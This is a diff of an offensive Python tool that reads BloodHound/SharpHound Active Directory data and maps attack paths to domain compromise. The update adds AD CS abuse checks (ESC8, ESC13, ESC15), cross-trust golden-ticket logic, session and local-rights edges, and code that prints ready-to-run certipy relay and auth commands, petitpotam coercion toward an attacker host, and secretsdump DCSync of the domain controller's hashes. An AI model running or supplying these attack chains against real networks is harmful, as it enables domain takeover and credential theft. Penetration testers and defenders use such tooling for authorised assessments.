@@ -38,7 +38,7 @@ import sys
 import zipfile
 from collections import defaultdict, deque
 
-__version__ = "1.0"
+__version__ = "1.1"
 
 # --------------------------------------------------------------------------- #
 # Colour
@@ -129,6 +129,8 @@ CONTROL_RIGHTS = {
     "WritePKINameFlag", "Enroll",
 }
 REPL_RIGHTS = {"GetChanges", "GetChangesAll", "GetChangesInFilteredSet", "DCSync"}
+# template ESCs where simply enrolling gets you a cert you can auth with as a DA
+ENROLL_ESCS = ("ESC1", "ESC2", "ESC3", "ESC9", "ESC15")
 
 def technique(right, target_kind, target_name):
     k = (target_kind or "").lower()
@@ -139,9 +141,26 @@ def technique(right, target_kind, target_name):
         "ESC3": f"ESC3: get an Enrollment Agent cert, then enroll on behalf of a DA -> {tn}",
         "ESC4": f"ESC4: rewrite the template to be ESC1, then enroll as a DA -> {tn}",
         "ESC9": f"ESC9: no-security-extension cert + weak mapping -> impersonate a DA -> {tn}",
+        "ESC8": f"ESC8: coerce a DC (PetitPotam/PrinterBug) and relay to CA web enrollment -> DC cert -> DCSync {tn}",
+        "ESC13": f"ESC13: enroll a cert whose issuance policy is linked to {tn} -> auth with it and act as a member",
+        "ESC15": f"ESC15 (EKUwu): schema-v1 template + supplied subject -> inject Client Auth policy -> impersonate a DA -> {tn}",
     }
     if right in esc:
         return esc[right]
+    if right == "HasSession":
+        return f"{tn} is logged on here -> dump their creds/tickets (needs admin/SYSTEM on this host)"
+    if right == "CanRDP":
+        return f"RDP into {tn} (shell as you; local privesc for SYSTEM)"
+    if right == "CanPSRemote":
+        return f"WinRM/PSRemote into {tn} (evil-winrm; local privesc for SYSTEM)"
+    if right == "ExecuteDCOM":
+        return f"Execute code on {tn} over DCOM (dcomexec.py) as you"
+    if right == "SQLAdmin":
+        return f"sysadmin on {tn}'s MSSQL -> xp_cmdshell as the service account"
+    if right == "HasSIDHistory":
+        return f"Your sIDHistory carries {tn}'s SID -> you hold its rights"
+    if right == "SpoofSIDHistory":
+        return f"Golden ticket with ExtraSids (Enterprise Admins / RID 519) across the trust -> {tn}"
     if right == "MemberOf":
         return f"Member of {tn} - inherit all of its privileges (free)"
     if right == "GPOAbuse":
@@ -227,6 +246,11 @@ class Graph:
         self.gpo_by_guid = {}                  # GPO GUID (upper) -> node sid
         self.gpo_affects = {}                  # GPO sid -> set of computer sids
         self.maq = None                        # ms-DS-MachineAccountQuota (domain)
+        self.local_rights = []                 # (principal, computer, CanRDP/CanPSRemote/ExecuteDCOM)
+        self.sidhistory = []                   # (principal, SID it carries in sIDHistory)
+        self.trusts = []                       # dicts from _mk_trust
+        self.oid_group = {}                    # issuance-policy OID -> linked group SID (ESC13)
+        self.forest_root = None                # forest-root domain SID (ForestRootIdentifier)
 
     def node(self, sid):
         n = self.nodes.get(sid)
@@ -295,7 +319,7 @@ class Graph:
         if rid in HIGHVALUE_RIDS and n.kind in ("Group", "User"):
             return HIGHVALUE_RIDS[rid]
         if n.kind == "Domain":
-            return "Domain object (full compromise)"
+            return "Domain compromise"
         if n.kind == "Computer" and _is_dc(self, sid):
             return "Domain Controller"
         if n.kind == "Group" and n.p("admincount"):
@@ -327,6 +351,26 @@ class Graph:
                 self.add_edge(a, sid, "AdminTo")
             for a in n.allowed_to_act:
                 self.add_edge(a, sid, "AllowedToAct")
+            for u in n.sessions:
+                self.add_edge(sid, u, "HasSession")
+            for c in n.spntargets:
+                self.add_edge(sid, c, "SQLAdmin")
+        for (p, c, lbl) in self.local_rights:
+            self.add_edge(p, c, lbl)
+        for (p, h) in self.sidhistory:
+            self.add_edge(p, h, "HasSIDHistory")
+        for tr in self.trusts:
+            dn = self.node(tr["dst"])
+            if dn.kind == "Base":
+                dn.kind = "Domain"
+                dn.name = tr["name"]
+                dn.props = {"name": tr["name"], "foreign": True}
+                self.by_name.setdefault(tr["name"], tr["dst"])
+            we_reach, they_reach = _trust_abuse(tr)
+            if we_reach:
+                self.add_edge(tr["src"], tr["dst"], "SpoofSIDHistory")
+            if they_reach:
+                self.add_edge(tr["dst"], tr["src"], "SpoofSIDHistory")
 
     def bfs_path(self, src, dst):
         if src == dst:
@@ -501,17 +545,28 @@ def _mk_ca(obj):
             right = _get(a, "RightName", "Right")
             if psid and right:
                 casec.append((str(psid), str(right)))
-    http = []
+    http, http_vuln = [], []
     for e in _get(obj, "HttpEnrollmentEndpoints", default=[]) or []:
         r = e.get("Result") if isinstance(e, dict) else e
         if not r:
             continue
         if isinstance(r, str):
             http.append(r)
-        elif isinstance(r, dict):                       # {url/ADCSWebEnrollmentHTTP/...}
+            if r.lower().startswith("http://"):
+                http_vuln.append(r)
+        elif isinstance(r, dict):                       # {Url, Status, ADCSWebEnrollment*}
             url = (r.get("url") or r.get("Url") or r.get("URL")
                    or r.get("ADCSWebEnrollmentHTTP") or r.get("ADCSWebEnrollmentHTTPS"))
-            http.append(str(url) if url else str(r))
+            url = str(url) if isinstance(url, str) else str(r)
+            http.append(url)
+            status = str(r.get("Status") or r.get("status") or "").lower().replace("_", "")
+            if status:
+                vuln = "vulnerable" in status and "notvulnerable" not in status
+            else:
+                vuln = (r.get("ADCSWebEnrollmentHTTP") is True
+                        or url.lower().startswith("http://"))
+            if vuln:
+                http_vuln.append(url)
         elif isinstance(r, list):
             http.extend(str(x) for x in r if x)
         else:
@@ -520,7 +575,61 @@ def _mk_ca(obj):
     if isinstance(san, dict):
         san = san.get("Value") if san.get("Collected") else None
     return {"name": p.get("name", "?"), "props": p, "aces": aces + casec,
-            "casecurity": casec, "user_san": san, "http": http}
+            "casecurity": casec, "user_san": san, "http": http, "http_vuln": http_vuln}
+
+LOCAL_GROUP_EDGE = {"544": "AdminTo", "555": "CanRDP", "562": "ExecuteDCOM",
+                    "580": "CanPSRemote"}
+_LEGACY_LOCAL_FIELDS = (("LocalAdmins", "AdminTo"), ("RemoteDesktopUsers", "CanRDP"),
+                        ("DcomUsers", "ExecuteDCOM"), ("PSRemoteUsers", "CanPSRemote"))
+_TRUST_DIR = {"0": "Disabled", "1": "Inbound", "2": "Outbound", "3": "Bidirectional"}
+_TRUST_TYPE = {"0": "ParentChild", "1": "CrossLink", "2": "Forest", "3": "External",
+               "4": "Unknown"}
+_INTRA_FOREST = {"ParentChild", "CrossLink", "TreeRoot"}
+
+def _result_sids(v):
+    """SIDs out of a SharpHound {Results:[{ObjectIdentifier}]} block (or a bare list)."""
+    if isinstance(v, dict):
+        v = v.get("Results", []) or []
+    out = []
+    for r in (v or []):
+        s = _get(r, "ObjectIdentifier", "objectid") if isinstance(r, dict) else r
+        if s:
+            out.append(str(s))
+    return out
+
+def _add_local_right(g, n, principal, lbl):
+    if lbl == "AdminTo":
+        if principal not in n.admins:
+            n.admins.append(principal)
+    else:
+        g.local_rights.append((principal, n.sid, lbl))
+
+def _mk_trust(src_sid, tr):
+    d = str(_get(tr, "TrustDirection", default=""))
+    t = str(_get(tr, "TrustType", default=""))
+    sidf = _get(tr, "SidFilteringEnabled", default=None)
+    return {"src": src_sid,
+            "dst": str(_get(tr, "TargetDomainSid", "TargetDomainSID")),
+            "name": str(_get(tr, "TargetDomainName", default="") or "?").upper(),
+            "dir": _TRUST_DIR.get(d, d or "Unknown"),
+            "type": _TRUST_TYPE.get(t, t or "Unknown"),
+            "transitive": _get(tr, "IsTransitive", default=None),
+            "sidfilter": None if sidf is None else _truthy(sidf)}
+
+def _trust_abuse(tr):
+    """(we_reach_them, they_reach_us) for a trust as seen from the collected domain.
+
+    Inbound  = the other domain trusts us  -> our principals can authenticate there.
+    Outbound = we trust the other domain   -> their principals can authenticate here.
+    A domain compromise crosses the trust (ExtraSids / SID-history golden ticket) when
+    the trusting side does not filter SIDs. Inside a forest that filter never applies;
+    across forests we only know our own side's quarantine setting."""
+    intra = tr["type"] in _INTRA_FOREST
+    them_trust_us = tr["dir"] in ("Inbound", "Bidirectional")
+    we_trust_them = tr["dir"] in ("Outbound", "Bidirectional")
+    we_reach_them = them_trust_us and intra
+    they_reach_us = we_trust_them and (intra or tr["sidfilter"] is False)
+    return we_reach_them, they_reach_us
 
 def _ekus(tmpl):
     e = tmpl["props"].get("effectiveekus") or tmpl["props"].get("ekus") or []
@@ -724,6 +833,130 @@ def _sessions_index(g):
     g._sess_idx = idx
     return idx
 
+def _da_members(g):
+    out = set()
+    for sid, n in g.nodes.items():
+        if n.kind == "Group" and sid.rsplit("-", 1)[-1] in ("512", "519"):
+            out |= set(_expand_members(g, sid))
+    return out
+
+def _admin_sessions(g):
+    """[(computer_sid, [DA/EA user sids logged on there])] sorted by computer name."""
+    da = _da_members(g)
+    out = []
+    for csid, users in _sessions_index(g).items():
+        hit = [u for u in users if u in da]
+        if hit and g.nodes.get(csid):
+            out.append((csid, hit))
+    return sorted(out, key=lambda x: g.nodes[x[0]].name)
+
+def _trust_lines(g):
+    """[(text, abusable)] one per collected trust."""
+    out = []
+    for tr in g.trusts:
+        src = g.nodes[tr["src"]].name if tr["src"] in g.nodes else tr["src"]
+        we, they = _trust_abuse(tr)
+        arrow = {"Inbound": "<-", "Outbound": "->", "Bidirectional": "<->"}.get(tr["dir"], "--")
+        sf = {True: "SID filtering on", False: "SID filtering OFF", None: "SID filtering ?"}[tr["sidfilter"]]
+        txt = f"{src} {arrow} {tr['name']}  [{tr['type']}, {tr['dir']}, {sf}]"
+        if we:
+            txt += f"  - own {src} => golden ticket + ExtraSids => {tr['name']}"
+        if they:
+            txt += f"  - own {tr['name']} => ExtraSids => {src}"
+        if not (we or they) and tr["dir"] in ("Inbound", "Bidirectional"):
+            txt += f"  - your users can authenticate to {tr['name']} (enumerate/kerberoast it)"
+        out.append((txt, we or they))
+    return out
+
+def _domains(g):
+    """Every domain the collection knows about, primary first, as dicts:
+    sid, name, collected (its objects are in this data), role ('forest root',
+    'child of X', 'same forest', 'external', 'other forest' or ''), users, computers,
+    level (functional level), trust (the trust line from the primary's view, or None).
+
+    The forest root is ForestRootIdentifier when collected; otherwise inferred from the
+    names (ROOT.LOCAL is the parent of CHILD.ROOT.LOCAL) across intra-forest trusts."""
+    doms = {}
+    for sid in g.domain_sids:
+        doms[sid] = True
+    for tr in g.trusts:
+        doms.setdefault(tr["src"], True)
+        doms.setdefault(tr["dst"], tr["dst"] in g.domain_sids)
+    names = {s: (g.nodes[s].name if s in g.nodes else s).upper() for s in doms}
+    intra = {s for tr in g.trusts if tr["type"] in _INTRA_FOREST for s in (tr["src"], tr["dst"])}
+    if g.domain_sids:
+        intra.add(g.domain_sids[0])
+    root = g.forest_root if g.forest_root in doms else None
+    if not root and len(intra) > 1:
+        # the intra-forest domain whose name is a dotted suffix of the others
+        cands = [s for s in intra
+                 if all(s == o or names[o].endswith("." + names[s]) for o in intra)]
+        if len(cands) == 1:
+            root = cands[0]
+    if not root and len(intra) > 1:
+        # a ParentChild trust between unrelated names (a new tree) — the side that is
+        # not the collected primary is the parent we trust into
+        pc = [tr for tr in g.trusts if tr["type"] == "ParentChild"
+              and g.domain_sids and tr["src"] == g.domain_sids[0]]
+        if len(pc) == 1:
+            root = pc[0]["dst"]
+    users, comps = defaultdict(int), defaultdict(int)
+    for sid, n in g.nodes.items():
+        if n.kind in ("User", "Computer"):
+            d = sid.rsplit("-", 1)[0]
+            (users if n.kind == "User" else comps)[d] += 1
+    primary = g.domain_sids[0] if g.domain_sids else None
+    trust_of = {}
+    for tr in g.trusts:
+        if tr["src"] == primary:
+            trust_of[tr["dst"]] = tr
+    out = []
+    for sid, collected in doms.items():
+        tr = trust_of.get(sid)
+        if sid == root:
+            role = "forest root"
+        elif sid in intra and root:
+            role = f"child of {names[root]}"
+        elif sid in intra and sid != primary:
+            role = "same forest"
+        elif tr and tr["type"] == "External":
+            role = "external"
+        elif tr and tr["type"] == "Forest":
+            role = "other forest"
+        else:
+            role = ""
+        n = g.nodes.get(sid)
+        out.append({"sid": sid, "name": names[sid], "collected": collected, "role": role,
+                    "users": users.get(sid, 0), "computers": comps.get(sid, 0),
+                    "level": n.p("functionallevel") if n else None, "trust": tr,
+                    "primary": sid == primary})
+    out.sort(key=lambda d: (not d["primary"], d["role"] != "forest root", d["name"]))
+    return out
+
+def _domain_lines(g):
+    """[(text, highlight)] one per domain, for the summaries."""
+    out = []
+    for d in _domains(g):
+        bits = [d["name"]]
+        tags = []
+        if d["primary"]:
+            tags.append("this collection")
+        if d["role"]:
+            tags.append(d["role"])
+        if d["collected"]:
+            tags.append(f"{d['users']} users, {d['computers']} computers")
+            if d["level"]:
+                tags.append(f"level {d['level']}")
+        else:
+            tags.append("not collected - trust only")
+        tr = d["trust"]
+        if tr:
+            tags.append(f"trust {tr['dir'].lower()}")
+        bits.append("[" + ", ".join(tags) + "]")
+        bits.append(d["sid"])
+        out.append(("  ".join(bits), d["role"] == "forest root"))
+    return out
+
 def _computer_value(g, csid, priv=None):
     """Why controlling a computer matters beyond itself: it's a DC, or a
     privileged user exposes credentials on it (a session, or they're a local
@@ -780,8 +1013,23 @@ def _user_detail_lines(g, n):
             out.append(f"{short} = {v}")
     return out
 
+def _obj_domain(g, props):
+    """The collected domain an ADCS object belongs to: its domainsid, else its domain
+    name, else the first domain in the collection."""
+    ds = str(props.get("domainsid") or "")
+    if ds in g.domain_sids:
+        return ds
+    dn = str(props.get("domain") or "").upper()
+    for d in g.domain_sids:
+        n = g.nodes.get(d)
+        if dn and n and str(n.name).upper() == dn:
+            return d
+    return g.domain_sids[0] if g.domain_sids else None
+
+def _in_domain(sid, domain):
+    return bool(domain) and str(sid).startswith(domain + "-")
+
 def analyze_adcs(g):
-    domain = g.domain_sids[0] if g.domain_sids else None
 
     def expand(psid):
         out = {psid}
@@ -791,8 +1039,11 @@ def analyze_adcs(g):
                 out.add(m)
         return out
 
+    for ca in g.cas:
+        ca["domain"] = _obj_domain(g, ca["props"])
     for t in g.templates:
         p = t["props"]
+        domain = t["domain"] = _obj_domain(g, p)
         ekus = _ekus(t)
         no_eku = len(ekus) == 0
         auth = bool(set(ekus) & AUTH_EKUS) or no_eku
@@ -810,6 +1061,14 @@ def analyze_adcs(g):
             escs.append("ESC3")
         if nosec and auth and open_issue:
             escs.append("ESC9")
+        if str(p.get("schemaversion")) == "1" and ess and open_issue and "ESC1" not in escs:
+            escs.append("ESC15")
+        pols = p.get("issuancepolicies") or p.get("certificatepolicy") or []
+        pols = [pols] if isinstance(pols, str) else pols
+        linked = sorted({g.oid_group[str(o)] for o in pols if str(o) in g.oid_group})
+        t["esc13_groups"] = linked if (linked and auth and open_issue) else []
+        if t["esc13_groups"]:
+            escs.append("ESC13")
         write_abusers = set()
         for psid, right in t["aces"]:
             if right in TEMPLATE_WRITE:
@@ -825,13 +1084,18 @@ def analyze_adcs(g):
                 enrollers |= expand(psid)
         t["enrollers"] = enrollers
         t["write_abusers"] = write_abusers
-        if domain and (set(escs) & {"ESC1", "ESC2", "ESC3", "ESC9"}):
-            code = next(c for c in escs if c in ("ESC1", "ESC2", "ESC3", "ESC9"))
+        if domain and (set(escs) & set(ENROLL_ESCS)):
+            code = next(c for c in escs if c in ENROLL_ESCS)
             for e in enrollers:
                 en = g.nodes.get(e)
                 if en and en.kind in ("User", "Computer"):
                     g.add_edge(e, domain, code)
                     g.esc_branches.append((code, e, t["name"]))
+        for grp in t["esc13_groups"]:
+            for e in enrollers:
+                en = g.nodes.get(e)
+                if en and en.kind in ("User", "Computer"):
+                    g.add_edge(e, grp, "ESC13")
         if domain and "ESC4" in escs:
             for e in write_abusers:
                 en = g.nodes.get(e)
@@ -848,6 +1112,50 @@ def analyze_adcs(g):
                     if en and en.kind in ("User", "Group") and not _is_admin(g, e):
                         abusers.add(e)
         ca["esc7"] = abusers
+        domain = ca["domain"]
+        ca["esc8"] = _esc8(g, ca, domain)
+        if ca["esc8"].get("edge"):
+            g.add_edge(ca["esc8"]["source"], domain, "ESC8")
+            g.esc_branches.append(("ESC8", ca["esc8"]["source"], ca["name"]))
+
+def _esc8(g, ca, domain):
+    """ESC8 verdict for one CA: a relayable web-enrollment endpoint, a template a DC can
+    enroll in, and a DC other than the CA host to coerce (a host can't be relayed to itself).
+    Any domain user can coerce a DC, so the edge starts at Domain Users."""
+    out = {"urls": ca.get("http_vuln", []), "template": None, "coerce": [], "edge": False,
+           "source": None, "why": ""}
+    if not out["urls"] or not domain:
+        out["why"] = "no NTLM-relayable web-enrollment endpoint collected"
+        return out
+    dc_enroll = None
+    for t in g.templates:
+        if ca not in _ca_publishers(g, t):
+            continue
+        ekus = _ekus(t)
+        if ekus and not (set(ekus) & AUTH_EKUS):
+            continue
+        rids = {str(s).rsplit("-", 1)[-1] for s in t.get("enrollers", ())}
+        if ({"516"} & rids or any(str(s).endswith("S-1-5-9") for s in t.get("enrollers", ()))
+                or _template_cn(t).upper() == "DOMAINCONTROLLER"):
+            dc_enroll = t
+            break
+    out["template"] = _template_cn(dc_enroll) if dc_enroll else None
+    host = str(_ca_host(ca)).upper()
+    dcs = [n for s, n in g.nodes.items()
+           if n.kind == "Computer" and _is_dc(g, s) and _in_domain(s, domain)]
+    out["coerce"] = sorted({str(n.p("dnshostname") or n.name.split("@")[0]) for n in dcs}
+                           - {host, host.lower()}, key=str.lower)
+    out["source"] = next((s for s, n in g.nodes.items() if n.kind == "Group"
+                          and s.startswith(domain + "-") and s.rsplit("-", 1)[-1] == "513"), None)
+    if not dc_enroll:
+        out["why"] = "no DC-enrollable client-auth template published on this CA"
+    elif not out["coerce"]:
+        out["why"] = "the CA runs on the only DC - relay back to itself is blocked; coerce a member server instead"
+    elif not out["source"]:
+        out["why"] = "Domain Users group not in the collection"
+    else:
+        out["edge"] = True
+    return out
 
 def build_gpo_abuse(g):
     """Control of a GPO -> code execution on every computer it is linked to.
@@ -918,7 +1226,14 @@ def load(path):
             if kind == "EnterpriseCA":
                 g.cas.append(_mk_ca(obj))
                 continue
-            if kind in ("RootCA", "NTAuthStore", "IssuancePolicy", "AIACA"):
+            if kind == "IssuancePolicy":
+                oid = (_get(obj, "Properties", default={}) or {}).get("certtemplateoid")
+                link = _get(obj, "GroupLink", default=None)
+                gsid = _get(link, "ObjectIdentifier", "objectid") if isinstance(link, dict) else None
+                if oid and gsid:
+                    g.oid_group[str(oid)] = str(gsid)
+                continue
+            if kind in ("RootCA", "NTAuthStore", "AIACA"):
                 continue
             sid = _get(obj, "ObjectIdentifier", "objectid", "ObjectId")
             if not sid:
@@ -948,12 +1263,39 @@ def load(path):
             pg = _get(obj, "PrimaryGroupSID", "PrimaryGroupSid")
             if pg:
                 n.primary_group = str(pg)
-            la = _get(obj, "LocalAdmins", default=None)
-            if isinstance(la, dict):
-                for r in la.get("Results", []) or []:
-                    rid = _get(r, "ObjectIdentifier", "objectid")
-                    if rid:
-                        n.admins.append(str(rid))
+            for key, lbl in _LEGACY_LOCAL_FIELDS:
+                for rid in _result_sids(_get(obj, key, default=None)):
+                    _add_local_right(g, n, rid, lbl)
+            for lg in (_get(obj, "LocalGroups", default=[]) or []):
+                if not isinstance(lg, dict):
+                    continue
+                gid = str(_get(lg, "ObjectIdentifier", "objectid", default="") or "")
+                lbl = LOCAL_GROUP_EDGE.get(gid.rsplit("-", 1)[-1])
+                if not lbl:
+                    continue
+                machine = gid.rsplit("-", 1)[0] + "-"
+                for r in (_get(lg, "Results", default=[]) or []):
+                    rid = _get(r, "ObjectIdentifier", "objectid") if isinstance(r, dict) else r
+                    otype = str(_get(r, "ObjectType", default="") or "") if isinstance(r, dict) else ""
+                    if not rid or str(rid).startswith(machine) or otype.startswith("Local"):
+                        continue
+                    _add_local_right(g, n, str(rid), lbl)
+            for st in (_get(obj, "SPNTargets", default=[]) or []):
+                if isinstance(st, dict) and str(_get(st, "Service", default="")) == "SQLAdmin":
+                    csid = _get(st, "ComputerSID", "ComputerSid")
+                    if csid:
+                        n.spntargets.append(str(csid))
+            for hs in (_get(obj, "HasSIDHistory", default=[]) or []):
+                hsid = _get(hs, "ObjectIdentifier", "objectid") if isinstance(hs, dict) else hs
+                if hsid:
+                    g.sidhistory.append((sid, str(hsid)))
+            if kind == "Domain":
+                fr = _get(obj, "ForestRootIdentifier", default=None)
+                if fr:
+                    g.forest_root = str(fr)
+                for tr in (_get(obj, "Trusts", default=[]) or []):
+                    if isinstance(tr, dict) and _get(tr, "TargetDomainSid", "TargetDomainSID"):
+                        g.trusts.append(_mk_trust(sid, tr))
             ata = _get(obj, "AllowedToAct", default=None)
             if isinstance(ata, dict):
                 ata = ata.get("Results", []) or []
@@ -965,13 +1307,14 @@ def load(path):
                 rid = _get(r, "ObjectIdentifier", "objectid") if isinstance(r, dict) else r
                 if rid:
                     n.allowed_to_delegate.append(str(rid))
-            sess = _get(obj, "Sessions", default=None)
-            if isinstance(sess, dict):
-                sess = sess.get("Results", []) or []
-            for r in (sess or []):
-                u = _get(r, "UserSID", "UserSid") if isinstance(r, dict) else None
-                if u:
-                    n.sessions.append(str(u))
+            for key in ("Sessions", "PrivilegedSessions", "RegistrySessions"):
+                sess = _get(obj, key, default=None)
+                if isinstance(sess, dict):
+                    sess = sess.get("Results", []) or []
+                for r in (sess or []):
+                    u = _get(r, "UserSID", "UserSid") if isinstance(r, dict) else None
+                    if u and str(u) not in n.sessions:
+                        n.sessions.append(str(u))
             # GPO structure: container tree + GPLinks
             if n.kind in ("Domain", "OU", "Container"):
                 for c in (_get(obj, "ChildObjects", default=[]) or []):
@@ -1145,6 +1488,15 @@ def cmd_summary(g, args):
            if n.p("unconstraineddelegation") and not _is_default_unconstrained(g, n.sid)]
     bullet("Non-default unconstrained delegation",
            [red(n.name.split("@")[0]) for n in unc])
+
+    bullet("Computers with a Domain/Enterprise Admin session (admin there = DA creds)",
+           [red(g.nodes[c].name.split("@")[0]) + dim("  ← " + ", ".join(
+               g.nodes[u].name.split("@")[0] for u in us if u in g.nodes))
+            for c, us in _admin_sessions(g)])
+    dl = _domain_lines(g)
+    if len(dl) > 1:
+        bullet("Domains", [(mag(t) if root else t) for t, root in dl])
+    bullet("Domain trusts", [(red(t) if bad else t) for t, bad in _trust_lines(g)])
 
     dc_unc = [n for n in g.nodes.values()
               if n.p("unconstraineddelegation") and _is_default_unconstrained(g, n.sid)]
@@ -1732,7 +2084,8 @@ def _ca_publishers(g, t):
             pubs.append(ca)
     if not pubs and len(g.cas) == 1:        # single CA in the collection -> it's the publisher
         pubs = list(g.cas)
-    return pubs
+    same = [ca for ca in pubs if ca.get("domain") and ca.get("domain") == t.get("domain")]
+    return same or pubs
 
 def _login_name(g, sid, dom):
     """A certipy -u value for a principal (sam@domain; machine accounts keep the $)."""
@@ -1798,7 +2151,26 @@ def _certipy_lines(code, dom, caname, cahost, cn, enroller_upn, tgt_upn, tgt_sid
                 f"# set victim's userPrincipalName to '{tgt_upn.split('@')[0]}' (no $), then:",
                 base,
                 f"certipy auth -pfx <victim>.pfx -dc-ip <DC_IP>   # maps to {tgt_upn.split('@')[0]}"]
+    if code == "ESC15":
+        return ["# schema-v1 template: inject the Client Authentication application policy",
+                "# (unpatched CAs only - CVE-2024-49019, fixed Nov 2024):",
+                f"{base} \\",
+                f"    -upn {tgt_upn} -sid {tgt_sid} -application-policies 'Client Authentication'",
+                f"certipy auth -pfx {pfx}.pfx -dc-ip <DC_IP> -ldap-shell"
+                "      # if PKINIT refuses it, use the LDAP shell"]
+    if code == "ESC13":
+        me = enroller_upn.split('@')[0].lower()
+        return ["# the cert's issuance policy is linked to a group - its TGT carries that group:",
+                base,
+                f"certipy auth -pfx {me}.pfx -dc-ip <DC_IP>      # then use the ccache as {me}"]
     return [base]
+
+def _esc8_lines(dom, cahost, tmpl, dc):
+    return [f"certipy relay -target http://{cahost} -template {tmpl}",
+            f"petitpotam.py -u <user> -p '<password>' -d {dom} <ATTACKER_IP> {dc}"
+            "      # or printerbug.py / coercer",
+            f"certipy auth -pfx {dc.split('.')[0].lower()}.pfx -dc-ip <DC_IP>      # DC$ hash",
+            f"secretsdump.py -hashes :<NT> '{dom}/{dc.split('.')[0].upper()}$'@{dc} -just-dc"]
 
 def cmd_adcs(g, args):
     header("Active Directory Certificate Services (ESC) analysis")
@@ -1812,9 +2184,21 @@ def cmd_adcs(g, args):
                   f"   (domain {_adcs_domain(g)})"))
         if ca.get("user_san"):
             print(red("      ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 (user-specified SAN)"))
-        if ca.get("http"):
-            print(red("      ESC8: HTTP enrollment endpoint(s): "
-                      + ", ".join(str(x) for x in ca["http"])))
+        e8 = ca.get("esc8") or {}
+        if e8.get("edge"):
+            print(red("      ESC8: NTLM-relayable web enrollment: " + ", ".join(e8["urls"])))
+            print(red(f"            any domain user -> coerce {e8['coerce'][0]} -> relay -> "
+                      f"{e8['template']} cert -> DCSync"))
+            print(cyan("      certipy ESC8:"))
+            for line in _esc8_lines(str(ca["props"].get("domain") or dom), _ca_host(ca),
+                                    e8["template"], e8["coerce"][0]):
+                print(cyan(f"        {line}"))
+        elif e8.get("urls"):
+            print(yellow("      ESC8: relayable web enrollment " + ", ".join(e8["urls"])
+                         + f" - but {e8['why']}"))
+        elif ca.get("http"):
+            print(yellow("      web enrollment endpoint(s): " + ", ".join(str(x) for x in ca["http"])
+                         + "  (HTTPS - relayable only without EPA; check with certipy find)"))
         for e in sorted(ca.get("esc7", [])):
             print(red(f"      ESC7: {g.nodes[e].name if e in g.nodes else e} has Manage rights on the CA"))
         if not (ca.get("user_san") or ca.get("http") or ca.get("esc7")):
@@ -1828,11 +2212,10 @@ def cmd_adcs(g, args):
             print(f"      {green(upn)}   {yellow(sid)}   {dim('[' + label + ']')}")
         if len(targets) > 15:
             print(dim(f"      … +{len(targets) - 15} more"))
-    primary_tgt = targets[0] if targets else (None, "<ADMIN_SID>", "administrator@" + dom.lower(), "")
 
     vuln = [t for t in g.templates if t.get("escs")]
     def _abusers(t):
-        ab = t.get("enrollers", set()) if (set(t["escs"]) & {"ESC1", "ESC2", "ESC3", "ESC9"}) else set()
+        ab = t.get("enrollers", set()) if (set(t["escs"]) & set(ENROLL_ESCS + ("ESC13",))) else set()
         ab = ab | t.get("write_abusers", set())
         interesting = sorted({a for a in ab if g.nodes.get(a)
                               and g.nodes[a].kind in ("User", "Computer") and not _is_admin(g, a)},
@@ -1868,21 +2251,30 @@ def cmd_adcs(g, args):
                   f"ManagerApproval={_truthy(p.get('requiresmanagerapproval'))}  "
                   f"AuthSignatures={p.get('authorizedsignatures')}  "
                   f"NoSecurityExt={_truthy(p.get('nosecurityextension'))}"))
-        print(red("      enroll as    : NON-admin principals (own one => domain compromise):"))
+        gain = ("you act as the linked group" if t["escs"] == ["ESC13"] else "domain compromise")
+        print(red(f"      enroll as    : NON-admin principals (own one => {gain}):"))
         for a in interesting:
             sid = a
             print(f"            {green(g.nodes[a].name)}   {dim(sid)}")
         if admins:
             print(dim(f"      (also enrollable by admins: {', '.join(admins)})"))
         # ready-to-adapt certipy — use the first non-admin enroller + the primary target
-        code = next((c for c in ("ESC1", "ESC4", "ESC3", "ESC2", "ESC9") if c in t["escs"]), t["escs"][0])
+        code = next((c for c in ("ESC1", "ESC4", "ESC15", "ESC3", "ESC2", "ESC9", "ESC13")
+                     if c in t["escs"]), t["escs"][0])
+        if t.get("esc13_groups"):
+            print(red("      ESC13 grants : "
+                      + ", ".join(g.nodes[s].name if s in g.nodes else s for s in t["esc13_groups"])))
         ca = pubs[0] if pubs else (g.cas[0] if g.cas else None)
         caname = _ca_name(ca) if ca else "<CA_NAME>"
         cahost = _ca_host(ca) if ca else "<CA_HOST>"
-        enroller = _login_name(g, interesting[0], dom) if interesting else f"<you>@{dom}"
+        tdom = _adcs_domain(g, t)
+        enroller = _login_name(g, interesting[0], tdom) if interesting else f"<you>@{tdom}"
+        # impersonate an admin of the template's own domain
+        tgt = next((x for x in targets if _in_domain(x[1], t.get("domain"))), None) \
+            or (None, "<ADMIN_SID>", "administrator@" + tdom.lower(), "")
         print(cyan(f"      certipy {code}:"))
-        for line in _certipy_lines(code, dom, caname, cahost, cn, enroller,
-                                   primary_tgt[2], primary_tgt[1]):
+        for line in _certipy_lines(code, tdom, caname, cahost, cn, enroller,
+                                   tgt[2], tgt[1]):
             print(cyan(f"        {line}"))
 
     if adminonly:
@@ -1978,7 +2370,11 @@ def cmd_escalate(g, args):
 # --------------------------------------------------------------------------- #
 def _tech_short(right, kind):
     k = (kind or "").lower()
-    if right in ("ESC1", "ESC2", "ESC3", "ESC4", "ESC9"):
+    if right == "ESC13":
+        return "ESC13: cert issuance policy -> act as group member"
+    if right == "ESC8":
+        return "ESC8: coerce DC + NTLM relay to web enrollment -> DCSync"
+    if right.startswith("ESC"):
         return f"{right}: cert abuse -> auth as any DA"
     if right == "GPOAbuse":
         return "edit GPO -> code exec (SYSTEM) on this host"
@@ -1998,6 +2394,13 @@ def _tech_short(right, kind):
         "DCSync": "DCSync the domain (dump all hashes)",
         "ReadGMSAPassword": "read the gMSA password",
         "ReadLAPSPassword": "read the LAPS local-admin password",
+        "HasSession": "logged on here -> dump their creds (needs admin)",
+        "CanRDP": "RDP in (then local privesc)",
+        "CanPSRemote": "WinRM in (then local privesc)",
+        "ExecuteDCOM": "code exec over DCOM",
+        "SQLAdmin": "MSSQL sysadmin -> xp_cmdshell",
+        "HasSIDHistory": "SID history -> holds its rights",
+        "SpoofSIDHistory": "golden ticket + ExtraSids across the trust",
     }
     if right in ("GenericAll", "GenericWrite", "WriteDacl", "WriteOwner", "Owns",
                  "WriteGPLink") and "gpo" in k:
@@ -2028,7 +2431,8 @@ _DANGER = {"ForceChangePassword", "GenericAll", "GenericWrite", "WriteDacl",
 
 def _edge_render(lbl):
     """Colour an edge label by danger so ACL abuse stands out from membership."""
-    if lbl.startswith("ESC") or lbl in ("DCSync", "AdminTo", "AllowedToAct", "GPOAbuse"):
